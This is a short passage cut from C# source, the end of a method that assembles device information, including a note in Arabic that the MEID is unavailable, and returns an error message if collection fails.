                    info.AppendLine($"MEID: غير متوفر");

                return info.ToString();
            }
            catch (Exception ex)
            {
                return $"خطأ في جمع المعلومات: {ex.Message}";
            }
        }
    }
}
